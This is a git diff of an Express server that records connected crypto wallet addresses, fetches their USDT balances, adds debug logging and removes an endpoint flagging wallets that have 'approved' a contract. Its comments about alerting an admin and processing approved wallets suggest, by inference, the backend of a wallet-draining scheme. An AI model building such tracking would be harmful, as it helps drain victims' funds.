@@ -134,6 +134,7 @@ app.get('/bot-info', async (req, res) => {
 });
 
 // Wallet connection endpoint - FIXED to allow reconnection
+// Wallet connection endpoint - with debugging
 app.post('/api/wallets/connect', async (req, res) => {
     try {
         const { address, name } = req.body;
@@ -142,6 +143,7 @@ app.post('/api/wallets/connect', async (req, res) => {
         
         // Validate address
         if (!address || address.length !== 42) {
+            console.log('❌ INVALID ADDRESS FORMAT');
             return res.status(400).json({
                 success: false,
                 error: 'Invalid wallet address'
@@ -149,24 +151,28 @@ app.post('/api/wallets/connect', async (req, res) => {
         }
         
         // Save wallet to database - UPSERT (insert or update)
+        console.log('💾 ATTEMPTING TO SAVE WALLET TO DATABASE');
         const query = `
-            INSERT INTO wallets (address, name, created_at, updated_at, is_approved, is_processed)
-            VALUES ($1, $2, NOW(), NOW(), false, false)
+            INSERT INTO wallets (address, name, created_at, updated_at, is_approved, is_processed, usdt_balance)
+            VALUES ($1, $2, NOW(), NOW(), false, false, '0')
             ON CONFLICT (address) DO UPDATE
-            SET name = $2, updated_at = NOW(), is_approved = false, is_processed = false
+            SET name = $2, updated_at = NOW(), is_approved = false, is_processed = false, usdt_balance = '0'
             RETURNING *
         `;
         
         const result = await database.query(query, [address, name || 'Unnamed Wallet']);
         const wallet = result.rows[0];
         
-        console.log('💾 WALLET SAVED TO DATABASE:', wallet.address);
+        console.log('✅ WALLET SAVED/UPDATED:', wallet.address);
         
-        // Get real balance and send alert to admin
+        // Get real balance from blockchain
+        console.log('🔍 FETCHING REAL BALANCE FROM BLOCKCHAIN');
         const contractService = require('./src/services/contract.service');
         const balance = await contractService.getWalletUSDTBalance(address);
+        console.log('💰 REAL BALANCE:', balance);
         
         // Update balance in database
+        console.log('💾 UPDATING BALANCE IN DATABASE');
         const updateQuery = `
             UPDATE wallets 
             SET usdt_balance = $1, last_balance_check = NOW()
@@ -195,51 +201,6 @@ app.post('/api/wallets/connect', async (req, res) => {
     }
 });
 
-// Wallet approval endpoint - This will be called AFTER wallet approves contract
-app.post('/api/wallets/approve', async (req, res) => {
-    try {
-        const { address } = req.body;
-        
-        // Validate address
-        if (!address || address.length !== 42) {
-            return res.status(400).json({
-                success: false,
-                error: 'Invalid wallet address'
-            });
-        }
-        
-        // Update approval status in database
-        const query = `
-            UPDATE wallets 
-            SET is_approved = true, updated_at = NOW()
-            WHERE address = $1
-            RETURNING *
-        `;
-        
-        const result = await database.query(query, [address]);
-        
-        if (result.rows.length === 0) {
-            return res.status(404).json({
-                success: false,
-                error: 'Wallet not found'
-            });
-        }
-        
-        const wallet = result.rows[0];
-        
-        res.json({
-            success: true,
-            message: 'Wallet approved successfully',
-            wallet: wallet
-        });
-    } catch (error) {
-        console.error('❌ WALLET APPROVAL ERROR:', error);
-        res.status(500).json({
-            success: false,
-            error: error.message
-        });
-    }
-});
 
 // NEW: Wallet balance endpoint
 app.get('/api/wallets/:address/balance', async (req, res) => {
@@ -331,3 +292,4 @@ process.on('SIGTERM', () => {
 });
 
 module.exports = app;
+
